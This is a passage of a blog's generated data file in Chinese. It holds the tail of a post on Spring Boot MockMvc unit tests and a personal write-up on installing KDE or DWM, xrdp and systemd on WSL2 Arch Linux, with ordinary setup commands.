class=\"title function_\">before</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;start testing&quot;</span>);</span><br><span class=\"line\">        setMockMvc();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@description</span> 执行测试之后的操作</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@date</span> 2022/8/21 10:39</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@author</span> neonat</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"meta\">@AfterEach</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">after</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;end testing&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"单元测试内模拟发送-Http-请求\"><a href=\"#单元测试内模拟发送-Http-请求\" class=\"headerlink\" title=\"单元测试内模拟发送 Http 请求\"></a>单元测试内模拟发送 Http 请求</h1><ol>\n<li>通过 MockMVC 对象</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@description</span> 测试Test类</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@date</span> 2022/8/21 10:38</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@author</span> neonat</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@version</span> 1.0.0</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">@SpringBootTest</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">DemoApplicationTests</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Autowired</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> WebApplicationContext webApplicationContext;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 伪造MVC环境，不会启动tomcat，速度更快</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> MockMvc mockMvc;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@description</span> 在测试之前注册mockMVC</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@date</span> 2022/8/20 17:10</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@author</span> neonat</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setMockMvc</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        mockMvc = MockMvcBuilders.webAppContextSetup(webApplicationContext).build();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@description</span> 测试带参数的get请求</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@date</span> 2022/8/21 10:37</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@author</span> neonat</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"meta\">@Test</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">testMore</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">MvcResult</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> mockMvc.perform(MockMvcRequestBuilders</span><br><span class=\"line\">                        .get(<span class=\"string\">&quot;/test/more&quot;</span>)<span class=\"comment\">// get请求</span></span><br><span class=\"line\">                        .param(<span class=\"string\">&quot;integer&quot;</span>, <span class=\"string\">&quot;12&quot;</span>)<span class=\"comment\">// 参数</span></span><br><span class=\"line\">                        .contentType(MediaType.APPLICATION_JSON)<span class=\"comment\">// 返回类型</span></span><br><span class=\"line\">                )</span><br><span class=\"line\">                .andExpect(MockMvcResultMatchers.status().isOk())<span class=\"comment\">// 期望返回结果正确</span></span><br><span class=\"line\">                .andReturn();</span><br><span class=\"line\">        <span class=\"comment\">// 打印返回内容</span></span><br><span class=\"line\">        System.out.println(result.getResponse().getContentAsString());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>通过 RestTemplate 远程调用</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// example cann&#x27;t run, leave it for next time</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"其他事项\"><a href=\"#其他事项\" class=\"headerlink\" title=\"其他事项\"></a>其他事项</h1><h2 id=\"测试类无法启动原因\"><a href=\"#测试类无法启动原因\" class=\"headerlink\" title=\"测试类无法启动原因\"></a>测试类无法启动原因</h2><ol>\n<li>需要写启动类；</li>\n<li>启动类所在的包要和单元测试所在的包在同一级根目录下。</li>\n</ol>\n<h2 id=\"Value-和-Autowired-注解不生效\"><a href=\"#Value-和-Autowired-注解不生效\" class=\"headerlink\" title=\"@Value 和@Autowired 注解不生效\"></a>@Value 和@Autowired 注解不生效</h2><p>使用过程中发现<code>@Value</code> 和 <code>@Autowired</code> 注解不生效，测试运行的对象注入值为 null。</p>\n<p>以下为文章分析原因：</p>\n<p>Spring 中，实例由容器管理，测试类中，容器因为没有对应的上下文，没有办法进行注入类的实例化操作，因此需要提供一个上下文环境给测试类，即添加如下两个注解到测试类。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RunWith(SpringRunner.class)</span> <span class=\"comment\">//意指让程序运行于Spring测试环境</span></span><br><span class=\"line\"><span class=\"meta\">@SpringBootTest(classes = HiveDeal.class)</span> <span class=\"comment\">//给测试类提供上下文环境</span></span><br></pre></td></tr></table></figure>\n\n<p>注解说明：<br><code>@RunWith</code> 类级别注解，提供了一种更改测试运行程序的默认机制。可以根据指定的类运行程序，指定的类必须是 <code>Runner</code> 类的子类。<br><code>@SpringBootTest</code> 通过这个注解，可以使 <code>JUnit</code> 单元测试执行在 <code>SpringBoot</code> 环境中，提供上下文环境。</p>\n<p>但是我实际使用过程中发现 <code>@Autowired</code> 里面再调用 <code>@Autowired</code> ，还是不能实现连续自动装配，尝试将多个类都放在 <code>@SpringBootTest</code> 中提供上下文环境，还是有问题，就算没出错也很繁琐，最后只能将上下文环境放在启动类中，但是这样使用测试实例时就是完完全全启动一个 SpringBoot 应用了，很重，暂时没有什么好的办法。</p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><ul>\n<li><a href=\"https://blog.csdn.net/lihuihui01/article/details/115975416\">springboot 测试类</a></li>\n<li><a href=\"https://blog.csdn.net/qq_35746632/article/details/100108651\">用 SpringBoot 单元测试如何模拟发送 HTTP 请求</a></li>\n<li><a href=\"https://blog.csdn.net/qq_44014971/article/details/108056557\">springboot 单元测试（get 请求）</a></li>\n<li><a href=\"https://blog.csdn.net/MDJ_D2T/article/details/123779419\">SpringBoot 单元测试，@Value 注解执行不生效问题解决，测试类依赖注入实例失败问题解决</a></li>\n</ul>"},{"title":"WSL2-桌面安装","date":"2022-05-03T14:43:52.000Z","_content":"\n这一次尝试一下在 wsl2 安装桌面环境并使用远程桌面连接使用，此篇文章作为记录。\n\n<!--more-->\n\n# 桌面安装\n\n## 先安装 xorg 桌面环境\n\nlinux 桌面很多都是 x 窗口的实现，基础服务，必装。\n\n```bash\n# xorg，将安装xorg-server，键盘驱动、鼠标驱动、显卡驱动等，若没有显卡驱动导致失败请自行安装适宜的显卡驱动\n# xorg-xinit，xorg初始化程序，提供了 xinit、startx 和默认的 xinitrc 文件\nsudo pacman -S xorg xorg-xinit\n```\n\n安装后请自行选择喜欢的桌面环境\n\n## KDE 桌面\n\n```bash\n# kde plasma 桌面\nsudo pacman -S plasma\n\n# （可选）KDE应用和SDDM图形登录界面\nsudo pacman -S kde-applications\nsudo pacman -S sddm sddm-kcm\n# 启动SSDM登录界面服务，注意到wsl会无法找到这个命令，下文会涉及到\nsudo systemctl enable sddm\n```\n\n## DWM 桌面\n\n这次也尝试一下平铺式桌面，没那么多花里胡哨的，想要花里胡哨也可以自定义，可以说是非常自由了。\n\n我这次选择尝试的是 DWM。\n\n```bash\n# 克隆dwm源码\ngit clone https://git.suckless.org/dwm\ncd dwm/\n# 修改config.mk文件\nvim config.mk\n# X11INC = /usr/X11R6/include ->  X11INC = /usr/include/X11\n# X11LIB = /usr/X11R6/lib  ->  X11LIB = /usr/lib/X11\n# 编译安装\nsudo make clean install\n# X窗口服务启动时自动运行dwm窗口管理器\necho exec dwm >> ~/.xinitrc\n\n# 默认使用的终端模拟器是st\ngit clone https://git.suckless.org/st\ncd st/\n# 修改config.mk文件\nvim config.mk\n# X11INC = /usr/X11R6/include ->  X11INC = /usr/include/X11\n# X11LIB = /usr/X11R6/lib  ->  X11LIB = /usr/lib/X11\n# 编译安装\nsudo make clean install\n\n# 默认的程序启动器是dmenu\nsudo pacman -S dmenu\n```\n\n若安装完毕，可 `shift+alt+enter` 打开 st 终端， `alt+p` 打开 dmenu 并输入程序名称打开程序。\n\n这些快捷键和终端模拟器、程序启动器可在 dwm 源码的 config.def.h 中修改，注意每次修改完都要重新编译安装一次。\n\nps：尝试过安装 alacritty 终端和 rofi 启动器，但好像在 wsl 中不生效，只有 suckless 公司的三件套合在一起才正常，可能是我 config.def.h 修改的不正确，不管了。\n\n# Xrdp 安装\n\n我们的目的是使用 Windows 远程桌面连接 wsl，所以需要安装配置 Xrdp。\n\n## 必要软件\n\n```bash\n# 必要软件\nyay -S xrdp\n\n# （可选）xorgxrdp-glamor可以硬件加速，pulseaudio-module-xrdp实现声音重定向（wsl应该不需要）\nyay -S xorgxrdp-glamor pulseaudio-module-xrdp\n\n# 修改配置文件\necho \"allowed_users=anybody\" | sudo tee /etc/X11/Xwrapper.config\n\n# X窗口服务启动时自动运行桌面环境\n# 将.xinitrc文件拷贝到用户目录下并修改\ncp /etc/X11/xinit/xinitrc ~/.xinitrc\nvim ~/.xinitrc\n# 注释掉.xinitrc最后几行\n# twm &\n# xclock -geometry 50x50-1+1 &\n# xterm -geometry 80x50+494+51 &\n# xterm -geometry 80x20+494-0 &\n# exec xterm -geometry 80x66+0+0 -name login\n# 1、若使用的是dwm，加上这句话\nexec dwm\n# 2、若使用的是kde，加上两个配置\nexport DESKTOP_SESSION=plasma\nexec /usr/lib/plasma-dbus-run-session-if-needed startplasma-x11\n\n# 启动xrdp服务，wsl2直接使用systemctl会失败\nsudo systemctl enable xrdp\n```\n\n## 配置修改\n\nwsl 使用直接使用远程桌面连接时可能会端口冲突，可修改 xrdp 默认的 3389 端口\n\n```bash\nsudo vim /etc/xrdp/xrdp.ini\n# 如将端口改成3390\n# port=3390\n```\n\n# wsl2 与 systemd 进程\n\n## 20221020\n\n**wsl2 现已原生支持 systemd**，目前需要 wsl 版本 **0.67.6** 及以上。\n\n方法：升级 wsl 版本后，通过以下命令建立 wsl.conf 文件并开启 systemd：\n\n```bash\necho -e \"[boot]\\nsystemd=true\" | sudo tee -a /etc/wsl.conf\n```\n\n来源：[WSL 2 上启用微软官方支持的 systemd](https://www.cnblogs.com/wswind/p/wsl2-official-systemd.html)\n\n## 原来记录\n\nwsl2 本身是由 Windows 负责的，因此根进程不是 systemd，导致直接使用 `systemctl` 命令会失败。\n\n可以使用 `pstree` 查看到进程树。\n\n所以我们要安装 `daemonize` 软件并修改一下，使得我们的 wsl 系统能正常开启 systemd 服务。\n\n```bash\n# 安装 daemonize\nsudo pacman -S daemonize\n\nsudo vim /etc/profile\n# 文件/etc/profile末尾加入\nSYSTEMD_PID=$(ps -ef | grep '/lib/systemd/systemd --system-unit=basic.target$' | grep -v unshare | awk '{print $2}')\nif [ -z \"$SYSTEMD_PID\" ]; then\n  sudo /usr/sbin/daemonize /usr/bin/unshare --fork --pid --mount-proc /lib/systemd/systemd --system-unit=basic.target\n  SYSTEMD_PID=$(ps -ef | grep '/lib/systemd/systemd --system-unit=basic.target$' | grep -v unshare | awk '{print $2}')\nfi\nif [ -n \"$SYSTEMD_PID\" ] && [ \"$SYSTEMD_PID\" != \"1\" ]; then\n  exec sudo /usr/bin/nsenter -t $SYSTEMD_PID -a su - $LOGNAME\nfi\n```\n\nwsl 重启后再使用 `pstree` 可以看到正常 systemd 服务正常启动了，`systemctl` 命令此时可以使用。\n\n# 后记\n\n我发现将 wsl 的 systemd 服务启动后，`systemctl` 命令正常，远程桌面也正常，目的算是达到了。但是由于 wsl 不是被 Windows 接管，所以本来的 wslg 不能正常使用了，点击程序不会弹出程序窗口，真是鱼与熊掌不可兼得。\n\n无奈下只能退回，毕竟对比起来远程桌面不是那么方便，还是 wslg 更舒服一点，这个桌面只能算是尝鲜吧。\n\nwsl 目前（2022/05/04）只能 100% 或 200% 整数倍缩放，我使用的是 4k 高分屏，Windows 使用的是 150%，wsl 会降级到 100%，导致字体很小，开启到 200% 缩放字是大了，但看起来字体发虚模糊，还是只能调整 gui 应用的字体大小。远程桌面下终端字体大小不知道为什么还调不了，属实是难受，也是我最终没有使用远程桌面这个方案的原因之一。\n\n# 参考文章\n\n- [【桌面篇】Archlinux 安装 kde 桌面](https://www.cnblogs.com/huanhao/p/archlinuxdesktop.html)\n- [从零开始配置自己的 Arch Linux 桌面（极简）](https://zhuanlan.zhihu.com/p/112536524)\n- [Arch Linux 下安装 dwm (平铺式窗口管理器)](https://blog.csdn.net/weixin_44335269/article/details/117886927)\n- [入坑 dwm——原来窗口管理器还可以这样用？！](https://zhuanlan.zhihu.com/p/183861786)\n- [简单配置窗口管理器（dwm）](https://zhuanlan.zhihu.com/p/408552473)\n- [dwm 美化](https://www.cnblogs.com/lanuage/p/15970577.html)\n- [配置 Xrdp - 通过 RDP 连接 Arch Linux KDE 远程桌面](https://alvin.red/2021/11/06/archlinux-xrdp/)\n- [WSL2 使用 xrdp 实现图形桌面](https://zhuanlan.zhihu.com/p/149501381)\n- [WSL2 的 Linux 中运行 systemctl 命令](https://zhuanlan.zhihu.com/p/335162006)\n- [WSL2 Ubuntu 永久开启 systemctl 命令的简单方法](https://www.cnblogs.com/MorStar/p/15078738.html)\n","source":"_posts/2022/05/WSL2-桌面安装.md","raw":"---\ntitle: WSL2-桌面安装\ndate: 2022-05-03 22:43:52\ntags:\n  - 配置\n  - WSL\ncategories:\n  - 配置\n  - WSL\n---\n\n这一次尝试一下在 wsl2 安装桌面环境并使用远程桌面连接使用，此篇文章作为记录。\n\n<!--more-->\n\n# 桌面安装\n\n## 先安装 xorg 桌面环境\n\nlinux 桌面很多都是 x 窗口的实现，基础服务，必装。\n\n```bash\n# xorg，将安装xorg-server，键盘驱动、鼠标驱动、显卡驱动等，若没有显卡驱动导致失败请自行安装适宜的显卡驱动\n# xorg-xinit，xorg初始化程序，提供了 xinit、startx 和默认的 xinitrc 文件\nsudo pacman -S xorg xorg-xinit\n```\n\n安装后请自行选择喜欢的桌面环境\n\n## KDE 桌面\n\n```bash\n# kde plasma 桌面\nsudo pacman -S plasma\n\n# （可选）KDE应用和SDDM图形登录界面\nsudo pacman -S kde-applications\nsudo pacman -S sddm sddm-kcm\n# 启动SSDM登录界面服务，注意到wsl会无法找到这个命令，下文会涉及到\nsudo systemctl enable sddm\n```\n\n## DWM 桌面\n\n这次也尝试一下平铺式桌面，没那么多花里胡哨的，想要花里胡哨也可以自定义，可以说是非常自由了。\n\n我这次选择尝试的是 DWM。\n\n```bash\n# 克隆dwm源码\ngit clone https://git.suckless.org/dwm\ncd dwm/\n# 修改config.mk文件\nvim config.mk\n# X11INC = /usr/X11R6/include ->  X11INC = /usr/include/X11\n# X11LIB = /usr/X11R6/lib  ->  X11LIB = /usr/lib/X11\n# 编译安装\nsudo make clean install\n# X窗口服务启动时自动运行dwm窗口管理器\necho exec dwm >> ~/.xinitrc\n\n# 默认使用的终端模拟器是st\ngit clone https://git.suckless.org/st\ncd st/\n# 修改config.mk文件\nvim config.mk\n# X11INC = /usr/X11R6/include ->  X11INC = /usr/include/X11\n# X11LIB = /usr/X11R6/lib  ->  X11LIB = /usr/lib/X11\n# 编译安装\nsudo make clean install\n\n# 默认的程序启动器是dmenu\nsudo pacman -S dmenu\n```\n\n若安装完毕，可 `shift+alt+enter` 打开 st 终端， `alt+p` 打开 dmenu 并输入程序名称打开程序。\n\n这些快捷键和终端模拟器、程序启动器可在 dwm 源码的 config.def.h 中修改，注意每次修改完都要重新编译安装一次。\n\nps：尝试过安装 alacritty 终端和 rofi 启动器，但好像在 wsl 中不生效，只有 suckless 公司的三件套合在一起才正常，可能是我 config.def.h 修改的不正确，不管了。\n\n# Xrdp 安装\n\n我们的目的是使用 Windows 远程桌面连接 wsl，所以需要安装配置 Xrdp。\n\n## 必要软件\n\n```bash\n# 必要软件\nyay -S xrdp\n\n# （可选）xorgxrdp-glamor可以硬件加速，pulseaudio-module-xrdp实现声音重定向（wsl应该不需要）\nyay -S xorgxrdp-glamor pulseaudio-module-xrdp\n\n# 修改配置文件\necho \"allowed_users=anybody\" | sudo tee /etc/X11/Xwrapper.config\n\n# X窗口服务启动时自动运行桌面环境\n# 将.xinitrc文件拷贝到用户目录下并修改\ncp /etc/X11/xinit/xinitrc ~/.xinitrc\nvim ~/.xinitrc\n# 注释掉.xinitrc最后几行\n# twm &\n# xclock -geometry 50x50-1+1 &\n# xterm -geometry 80x50+494+51 &\n# xterm -geometry 80x20+494-0 &\n# exec xterm -geometry 80x66+0+0 -name login\n# 1、若使用的是dwm，加上这句话\nexec dwm\n# 2、若使用的是kde，加上两个配置\nexport DESKTOP_SESSION=plasma\nexec /usr/lib/plasma-dbus-run-session-if-needed startplasma-x11\n\n# 启动xrdp服务，wsl2直接使用systemctl会失败\nsudo systemctl enable xrdp\n```\n\n## 配置修改\n\nwsl 使用直接使用远程桌面连接时可能会端口冲突，可修改 xrdp 默认的 3389 端口\n\n```bash\nsudo vim /etc/xrdp/xrdp.ini\n# 如将端口改成3390\n# port=3390\n```\n\n# wsl2 与 systemd 进程\n\n## 20221020\n\n**wsl2 现已原生支持 systemd**，目前需要 wsl 版本 **0.67.6** 及以上。\n\n方法：升级 wsl 版本后，通过以下命令建立 wsl.conf 文件并开启 systemd：\n\n```bash\necho -e \"[boot]\\nsystemd=true\" | sudo tee -a /etc/wsl.conf\n```\n\n来源：[WSL 2 上启用微软官方支持的 systemd](https://www.cnblogs.com/wswind/p/wsl2-official-systemd.html)\n\n## 原来记录\n\nwsl2 本身是由 Windows 负责的，因此根进程不是 systemd，导致直接使用 `systemctl` 命令会失败。\n\n可以使用 `pstree` 查看到进程树。\n\n所以我们要安装 `daemonize` 软件并修改一下，使得我们的 wsl 系统能正常开启 systemd 服务。\n\n```bash\n# 安装 daemonize\nsudo pacman -S daemonize\n\nsudo vim /etc/profile\n# 文件/etc/profile末尾加入\nSYSTEMD_PID=$(ps -ef | grep '/lib/systemd/systemd --system-unit=basic.target$' | grep -v unshare | awk '{print $2}')\nif [ -z \"$SYSTEMD_PID\" ]; then\n  sudo /usr/sbin/daemonize /usr/bin/unshare --fork --pid --mount-proc /lib/systemd/systemd --system-unit=basic.target\n  SYSTEMD_PID=$(ps -ef | grep '/lib/systemd/systemd --system-unit=basic.target$' | grep -v unshare | awk '{print $2}')\nfi\nif [ -n \"$SYSTEMD_PID\" ] && [ \"$SYSTEMD_PID\" != \"1\" ]; then\n  exec sudo /usr/bin/nsenter -t $SYSTEMD_PID -a su - $LOGNAME\nfi\n```\n\nwsl 重启后再使用 `pstree` 可以看到正常 systemd 服务正常启动了，`systemctl` 命令此时可以使用。\n\n# 后记\n\n我发现将 wsl 的 systemd 服务启动后，`systemctl` 命令正常，远程桌面也正常，目的算是达到了。但是由于 wsl 不是被 Windows 接管，所以本来的 wslg 不能正常使用了，点击程序不会弹出程序窗口，真是鱼与熊掌不可兼得。\n\n无奈下只能退回，毕竟对比起来远程桌面不是那么方便，还是 wslg 更舒服一点，这个桌面只能算是尝鲜吧。\n\nwsl 目前（2022/05/04）只能 100% 或 200% 整数倍缩放，我使用的是 4k 高分屏，Windows 使用的是 150%，wsl 会降级到 100%，导致字体很小，开启到 200% 缩放字是大了，但看起来字体发虚模糊，还是只能调整 gui 应用的字体大小。远程桌面下终端字体大小不知道为什么还调不了，属实是难受，也是我最终没有使用远程桌面这个方案的原因之一。\n\n# 参考文章\n\n- [【桌面篇】Archlinux 安装 kde 桌面](https://www.cnblogs.com/huanhao/p/archlinuxdesktop.html)\n- [从零开始配置自己的 Arch Linux 桌面（极简）](https://zhuanlan.zhihu.com/p/112536524)\n- [Arch Linux 下安装 dwm (平铺式窗口管理器)](https://blog.csdn.net/weixin_44335269/article/details/117886927)\n- [入坑 dwm——原来窗口管理器还可以这样用？！](https://zhuanlan.zhihu.com/p/183861786)\n- [简单配置窗口管理器（dwm）](https://zhuanlan.zhihu.com/p/408552473)\n- [dwm 美化](https://www.cnblogs.com/lanuage/p/15970577.html)\n- [配置 Xrdp - 通过 RDP 连接 Arch Linux KDE 远程桌面](https://alvin.red/2021/11/06/archlinux-xrdp/)\n- [WSL2 使用 xrdp 实现图形桌面](https://zhuanlan.zhihu.com/p/149501381)\n- [WSL2 的 Linux 中运行 systemctl 命令](https://zhuanlan.zhihu.com/p/335162006)\n- [WSL2 Ubuntu 永久开启 systemctl 命令的简单方法](https://www.cnblogs.com/MorStar/p/15078738.html)\n","slug":"2022/05/WSL2-桌面安装","published":1,"updated":"2022-10-20T15:24:24.653Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clyh3xcj4001uzge3eoaj3cs1","content":"<p>这一次尝试一下在 wsl2 安装桌面环境并使用远程桌面连接使用，此篇文章作为记录。</p>\n<span id=\"more\"></span>\n\n<h1 id=\"桌面安装\"><a href=\"#桌面安装\" class=\"headerlink\" title=\"桌面安装\"></a>桌面安装</h1><h2 id=\"先安装-xorg-桌面环境\"><a href=\"#先安装-xorg-桌面环境\" class=\"headerlink\" title=\"先安装 xorg 桌面环境\"></a>先安装 xorg 桌面环境</h2><p>linux 桌面很多都是 x 窗口的实现，基础服务，必装。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># xorg，将安装xorg-server，键盘驱动、鼠标驱动、显卡驱动等，若没有显卡驱动导致失败请自行安装适宜的显卡驱动</span></span><br><span class=\"line\"><span class=\"comment\"># xorg-xinit，xorg初始化程序，提供了 xinit、startx 和默认的 xinitrc 文件</span></span><br><span class=\"line\">sudo pacman -S xorg xorg-xinit</span><br></pre></td></tr></table></figure>\n\n<p>安装后请自行选择喜欢的桌面环境</p>\n<h2 id=\"KDE-桌面\"><a href=\"#KDE-桌面\" class=\"headerlink\" title=\"KDE 桌面\"></a>KDE 桌面</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># kde plasma 桌面</span></span><br><span class=\"line\">sudo pacman -S plasma</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># （可选）KDE应用和SDDM图形登录界面</span></span><br><span class=\"line\">sudo pacman -S kde-applications</span><br><span class=\"line\">sudo pacman -S sddm sddm-kcm</span><br><span class=\"line\"><span class=\"comment\"># 启动SSDM登录界面服务，注意到wsl会无法找到这个命令，下文会涉及到</span></span><br><span class=\"line\">sudo systemctl <span class=\"built_in\">enable</span> sddm</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"DWM-桌面\"><a href=\"#DWM-桌面\" class=\"headerlink\" title=\"DWM 桌面\"></a>DWM 桌面</h2><p>这次也尝试一下平铺式桌面，没那么多花里胡哨的，想要花里胡哨也可以自定义，可以说是非常自由了。</p>\n<p>我这次选择尝试的是 DWM。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 克隆dwm源码</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://git.suckless.org/dwm</span><br><span class=\"line\"><span class=\"built_in\">cd</span> dwm/</span><br><span class=\"line\"><span class=\"comment\"># 修改config.mk文件</span></span><br><span class=\"line\">vim config.mk</span><br><span class=\"line\"><span class=\"comment\"># X11INC = /usr/X11R6/include -&gt;  X11INC = /usr/include/X11</span></span><br><span class=\"line\"><span class=\"comment\"># X11LIB = /usr/X11R6/lib  -&gt;  X11LIB = /usr/lib/X11</span></span><br><span class=\"line\"><span class=\"comment\"># 编译安装</span></span><br><span class=\"line\">sudo make clean install</span><br><span class=\"line\"><span class=\"comment\"># X窗口服务启动时自动运行dwm窗口管理器</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"built_in\">exec</span> dwm &gt;&gt; ~/.xinitrc</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 默认使用的终端模拟器是st</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://git.suckless.org/st</span><br><span class=\"line\"><span class=\"built_in\">cd</span> st/</span><br><span class=\"line\"><span class=\"comment\"># 修改config.mk文件</span></span><br><span class=\"line\">vim config.mk</span><br><span class=\"line\"><span class=\"comment\"># X11INC = /usr/X11R6/include -&gt;  X11INC = /usr/include/X11</span></span><br><span class=\"line\"><span class=\"comment\"># X11LIB = /usr/X11R6/lib  -&gt;  X11LIB = /usr/lib/X11</span></span><br><span class=\"line\"><span class=\"comment\"># 编译安装</span></span><br><span class=\"line\">sudo make clean install</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 默认的程序启动器是dmenu</span></span><br><span class=\"line\">sudo pacman -S dmenu</span><br></pre></td></tr></table></figure>\n\n<p>若安装完毕，可 <code>shift+alt+enter</code> 打开 st 终端， <code>alt+p</code> 打开 dmenu 并输入程序名称打开程序。</p>\n<p>这些快捷键和终端模拟器、程序启动器可在 dwm 源码的 config.def.h 中修改，注意每次修改完都要重新编译安装一次。</p>\n<p>ps：尝试过安装 alacritty 终端和 rofi 启动器，但好像在 wsl 中不生效，只有 suckless 公司的三件套合在一起才正常，可能是我 config.def.h 修改的不正确，不管了。</p>\n<h1 id=\"Xrdp-安装\"><a href=\"#Xrdp-安装\" class=\"headerlink\" title=\"Xrdp 安装\"></a>Xrdp 安装</h1><p>我们的目的是使用 Windows 远程桌面连接 wsl，所以需要安装配置 Xrdp。</p>\n<h2 id=\"必要软件\"><a href=\"#必要软件\" class=\"headerlink\" 